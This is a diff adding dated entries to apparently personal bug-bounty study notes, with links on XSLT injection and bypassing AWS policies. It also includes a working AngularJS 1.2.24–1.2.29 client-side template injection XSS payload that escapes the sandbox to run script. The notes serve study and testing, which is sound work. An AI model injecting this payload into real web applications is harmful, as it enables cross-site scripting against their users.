@@ -20,3 +20,15 @@
 
 ![img](https://pbs.twimg.com/media/EvONSJtXUAIQ4Xm?format=jpg&name=small)
 
+# 📅 02-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 60
+- [XSLT Injection ](https://twitter.com/harshbothra_/status/1366413262410059777?s=20)
+
+## AngularJS Client-Side Template Injection as XSS payload for 1.2.24-1.2.29
+```js
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+```
+
+# 📅 03-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 61
+- [Bypassing AWS Policies](https://twitter.com/harshbothra_/status/1366738335218028545?s=20)
